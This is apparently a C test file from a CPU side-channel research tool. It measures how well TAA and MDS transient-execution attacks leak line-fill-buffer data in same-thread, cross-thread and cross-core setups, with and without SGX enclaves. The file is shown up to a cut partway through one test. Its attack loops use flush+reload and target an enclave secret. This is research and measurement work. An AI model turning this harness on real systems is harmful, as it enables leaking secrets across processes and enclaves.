#pragma region shared

#define _GNU_SOURCE

#include "enclyser/app/app.h"
#include "enclyser/enclave/enclave_u.h"

#include <criterion/criterion.h>
#include <signal.h>
#include <sched.h>
#include <unistd.h>
#include <pthread.h>

sgx_enclave_id_t global_eid = 0;
sgx_launch_token_t token = {};
sgx_status_t ret = 0;
int updated = 0;

int app_filling_sequence = 0;
int app_clearing_sequence = 0;

enclyser_buffer_t app_filling_buffer = {
    .buffer = NULL,
    .shadow = NULL,
    .size = DEFAULT_FILLING_BUFFER_SIZE,
    .value = DEFAULT_BUFFER_VALUE,
    .order = DEFAULT_BUFFER_ORDER,
    .mem_type = DEFAULT_BUFFER_MEM_TYPE,
    .access_ctrl = DEFAULT_BUFFER_ACCESS_CTRL};

enclyser_buffer_t app_clearing_buffer = {
    .buffer = NULL,
    .shadow = NULL,
    .size = DEFAULT_CLEARING_BUFFER_SIZE,
    .value = DEFAULT_BUFFER_VALUE,
    .order = DEFAULT_BUFFER_ORDER,
    .mem_type = DEFAULT_BUFFER_MEM_TYPE,
    .access_ctrl = DEFAULT_BUFFER_ACCESS_CTRL};

enclyser_buffer_t app_faulting_buffer = {
    .buffer = NULL,
    .shadow = NULL,
    .size = DEFAULT_FAULTING_BUFFER_SIZE,
    .value = DEFAULT_BUFFER_VALUE,
    .order = DEFAULT_BUFFER_ORDER,
    .mem_type = DEFAULT_BUFFER_MEM_TYPE,
    .access_ctrl = DEFAULT_BUFFER_ACCESS_CTRL};

enclyser_attack_t app_attack_spec = {
    .major = DEFAULT_ATTACK_MAJOR,
    .minor = DEFAULT_ATTACK_MINOR,
    .offset = DEFAULT_ATTACK_OFFSET};

enclyser_buffer_t app_attaking_buffer = {
    .buffer = NULL,
    .shadow = NULL,
    .size = DEFAULT_ATTACKING_BUFFER_SIZE,
    .value = DEFAULT_BUFFER_VALUE,
    .order = DEFAULT_BUFFER_ORDER,
    .mem_type = DEFAULT_BUFFER_MEM_TYPE,
    .access_ctrl = DEFAULT_BUFFER_ACCESS_CTRL};

enclyser_buffer_t app_encoding_buffer = {
    .buffer = NULL,
    .shadow = NULL,
    .size = DEFAULT_ENCODING_BUFFER_SIZE,
    .value = DEFAULT_BUFFER_VALUE,
    .order = DEFAULT_BUFFER_ORDER,
    .mem_type = DEFAULT_BUFFER_MEM_TYPE,
    .access_ctrl = DEFAULT_BUFFER_ACCESS_CTRL};

enclyser_buffer_t app_printing_buffer = {
    .buffer = NULL,
    .shadow = NULL,
    .size = DEFAULT_PRINTING_BUFFER_SIZE,
    .value = DEFAULT_BUFFER_VALUE,
    .order = DEFAULT_BUFFER_ORDER,
    .mem_type = DEFAULT_BUFFER_MEM_TYPE,
    .access_ctrl = DEFAULT_BUFFER_ACCESS_CTRL};

enclyser_buffer_t encalve_secret_buffer = {
    .buffer = NULL,
    .shadow = NULL,
    .size = DEFAULT_SECRET_BUFFER_SIZE,
    .value = DEFAULT_BUFFER_VALUE,
    .order = DEFAULT_BUFFER_ORDER,
    .mem_type = DEFAULT_BUFFER_MEM_TYPE,
    .access_ctrl = DEFAULT_BUFFER_ACCESS_CTRL};

enclyser_sysinfo_t app_sysinfo = {};

// int sigsegv_signal;

// void sigsegv_handler(int signal)
// {
//     sigsegv_signal = signal;

//     ASSERT(!mprotect(app_faulting_buffer.buffer, app_faulting_buffer.size, PROT_READ | PROT_WRITE));

//     flush_enclyser_buffer(&app_encoding_buffer);
//     attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
//     reload(&app_encoding_buffer, &app_printing_buffer);

//     sigsegv_signal = 0;
// }

/**
 * @brief A helpher function that sets up the runnning environment.
 *
 * The environment includes \p app_filling_buffer, \p app_clearing_buffer,
 * \p app_attack, \p app_attaking_buffer, \p app_encoding_buffer.
 */
void construct_app_environment(void)
{
    ret = sgx_create_enclave(ENCLAVE_FILENAME, SGX_DEBUG_FLAG, &token, &updated, &global_eid, NULL);
    ASSERT(ret == SGX_SUCCESS);

    open_system_file();

    get_system_info(&app_sysinfo);

    ecall_get_secret(global_eid, &encalve_secret_buffer.buffer);

    malloc_enclyser_buffer(&app_filling_buffer);
    malloc_enclyser_buffer(&app_clearing_buffer);
    malloc_enclyser_buffer(&app_faulting_buffer);
    malloc_enclyser_buffer(&app_attaking_buffer);
    malloc_enclyser_buffer(&app_encoding_buffer);
    malloc_enclyser_buffer(&app_printing_buffer);
    malloc_enclyser_buffer(&encalve_secret_buffer);

    // ASSERT(signal(SIGSEGV, sigsegv_handler) != SIG_ERR);

    // sleep(5); // IMPORTANT! FIXME robust against signals */
}

/**
 * @brief A helper function that clearns up the running environment.
 *
 * The environment includes \p app_filling_buffer, \p app_clearing_buffer,
 * \p app_attack, \p app_attaking_buffer, \p app_encoding_buffer.
 */
void destruct_app_environment(void)
{
    sgx_destroy_enclave(global_eid);

    free_enclyser_buffer(&app_filling_buffer);
    free_enclyser_buffer(&app_clearing_buffer);
    free_enclyser_buffer(&app_faulting_buffer);
    free_enclyser_buffer(&app_attaking_buffer);
    free_enclyser_buffer(&app_encoding_buffer);
    free_enclyser_buffer(&app_printing_buffer);

    close_system_file();

    ASSERT(signal(SIGSEGV, SIG_DFL) != SIG_ERR);
}

#pragma endregion

#pragma region _system

Test(_system, print_system_info)
{
    open_system_file();

    get_system_info(&app_sysinfo);
    print_system_info(&app_sysinfo);

    close_system_file();
}

#pragma endregion

#pragma region taa

TestSuite(taa, .init = construct_app_environment, .fini = destruct_app_environment);

#pragma region same_thread_taa_nosgx_is_10_percent_effective

/**
 * @brief Test if same_thread_taa_nosgx is effective with a successful rate above or equal to 10% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_same_thread_taa_nosgx_is_10_percent_effective(void)
{
    int i, offset, allowance;
    int core;
    cpu_set_t cpuset;

    core = 1;

    CPU_ZERO(&cpuset);
    CPU_SET((size_t)core, &cpuset);

    ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;
        for (i = 0; i < REPETITION_TIME; i++)
        {
            fill_lfb(app_filling_sequence, &app_filling_buffer);
            flush_enclyser_buffer(&app_encoding_buffer);
            attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
            reload(&app_encoding_buffer, &app_printing_buffer);
        }
        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 10 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(taa, same_thread_taa_nosgx_is_10_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_TAA;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    app_filling_buffer.value = 0x1;
    app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    assign_enclyser_buffer(&app_filling_buffer);

    app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
    app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
    assign_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_same_thread_taa_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_same_thread_taa_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_same_thread_taa_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_same_thread_taa_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_same_thread_taa_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_same_thread_taa_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region same_thread_taa_sgx_is_10_percent_effective

/**
 * @brief Test if same_thread_taa_sgx is effective with a successful rate above or equal to 10% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_same_thread_taa_sgx_is_10_percent_effective(void)
{
    int i, offset, allowance;
    int core;
    cpu_set_t cpuset;

    core = 1;

    CPU_ZERO(&cpuset);
    CPU_SET((size_t)core, &cpuset);

    ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;
        for (i = 0; i < REPETITION_TIME; i++)
        {
            ecall_grooming(global_eid, app_filling_sequence, &app_filling_buffer, app_clearing_sequence, &app_clearing_buffer, &app_faulting_buffer);
            flush_enclyser_buffer(&app_encoding_buffer);
            attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
            reload(&app_encoding_buffer, &app_printing_buffer);
        }
        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 10 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(taa, same_thread_taa_sgx_is_10_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_TAA;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    app_filling_buffer.value = 0x41;
    app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    assign_enclyser_buffer(&app_filling_buffer);

    app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
    app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
    assign_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_same_thread_taa_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_same_thread_taa_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_same_thread_taa_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_same_thread_taa_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_same_thread_taa_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_same_thread_taa_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_thread_taa_nosgx_is_1_percent_effective

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_thread_taa_nosgx_is_1_percent_effective_victim_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME * 100; i++)
    {
        fill_lfb(app_filling_sequence, &app_filling_buffer);
    }

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_thread_taa_nosgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if cross_thread_taa_nosgx is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_thread_taa_nosgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_thread_taa_nosgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_thread_taa_nosgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(taa, cross_thread_taa_nosgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_TAA;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    app_filling_buffer.value = 0x1;
    app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    assign_enclyser_buffer(&app_filling_buffer);

    app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
    app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
    assign_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_thread_taa_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_thread_taa_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_thread_taa_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_thread_taa_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_thread_taa_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_thread_taa_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_thread_taa_sgx_is_1_percent_effective

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_thread_taa_sgx_is_1_percent_effective_victim_thread(void *arg)
{
    (void) arg; /** bypass the warning about unsed parameter */

    ecall_rep_fill_lfb(global_eid, app_filling_sequence, &app_filling_buffer);

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_thread_taa_sgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if cross_thread_taa_ecall is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_thread_taa_sgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_thread_taa_sgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_thread_taa_sgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(taa, cross_thread_taa_sgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_TAA;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    app_filling_buffer.value = 0x1;
    app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    assign_enclyser_buffer(&app_filling_buffer);

    app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
    app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
    assign_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_thread_taa_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_thread_taa_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_thread_taa_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_thread_taa_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_thread_taa_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_thread_taa_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_core_taa_nosgx_is_1_percent_effective

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_taa_nosgx_is_1_percent_effective_victim_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME * 100; i++)
    {
        fill_lfb(app_filling_sequence, &app_filling_buffer);
    }

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_taa_nosgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if cross_core_taa_nosgx is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_core_taa_nosgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores - 1;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_core_taa_nosgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_core_taa_nosgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(taa, cross_core_taa_nosgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_TAA;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    app_filling_buffer.value = 0x1;
    app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    assign_enclyser_buffer(&app_filling_buffer);

    app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
    app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
    assign_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_core_taa_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_core_taa_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_core_taa_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_core_taa_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_core_taa_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_core_taa_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_core_taa_sgx_is_1_percent_effective

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_taa_sgx_is_1_percent_effective_victim_thread(void *arg)
{
    (void) arg; /** bypass the warning about unsed parameter */

    ecall_rep_fill_lfb(global_eid, app_filling_sequence, &app_filling_buffer);

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_taa_sgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if cross_core_taa_ecall is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_core_taa_sgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores - 1;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_core_taa_sgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_core_taa_sgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(taa, cross_core_taa_sgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_TAA;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    app_filling_buffer.value = 0x1;
    app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    assign_enclyser_buffer(&app_filling_buffer);

    app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
    app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
    assign_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_core_taa_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_core_taa_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_core_taa_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_core_taa_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_core_taa_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_core_taa_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma endregion

#pragma region msd

TestSuite(mds, .init = construct_app_environment, .fini = destruct_app_environment);

#pragma region same_thread_mds_nosgx_is_10_percent_effective

/**
 * @brief Test if same_thread_mds_nosgx is effective with a successful rate above or equal to 10% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_same_thread_mds_nosgx_is_10_percent_effective(void)
{
    int i, offset, allowance;
    int core;
    cpu_set_t cpuset;

    core = 1;

    CPU_ZERO(&cpuset);
    CPU_SET((size_t)core, &cpuset);

    ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;
        for (i = 0; i < REPETITION_TIME; i++)
        {
            fill_lfb(app_filling_sequence, &app_filling_buffer);
            flush_enclyser_buffer(&app_encoding_buffer);
            attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
            reload(&app_encoding_buffer, &app_printing_buffer);
        }
        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 10 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(mds, same_thread_mds_nosgx_is_10_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_MDS;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    app_filling_buffer.value = 0x1;
    app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    assign_enclyser_buffer(&app_filling_buffer);

    app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
    app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
    assign_enclyser_buffer(&app_attaking_buffer);
    cripple_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_same_thread_mds_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_same_thread_mds_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_same_thread_mds_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

